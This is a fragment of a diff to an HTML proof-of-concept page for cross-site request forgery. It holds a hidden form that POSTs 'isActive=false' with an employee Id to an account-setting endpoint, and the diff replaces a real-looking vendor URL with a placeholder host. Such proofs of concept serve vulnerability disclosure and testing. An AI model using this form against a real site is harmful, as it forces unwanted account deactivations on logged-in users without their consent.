@@ -1,7 +1,7 @@
 <html>
   <!-- CSRF PoC - Sequential Form Submissions Without iframe -->
   <body>
-    <form id="csrfForm" action="https://integration.servicetitan.com/Settings/SetEmployeeIsActive" method="POST">
+    <form id="csrfForm" action="https://vulnerable_website.com/endpoint" method="POST">
       <input type="hidden" name="Id" id="empId" />
       <input type="hidden" name="isActive" value="false" />
     </form>
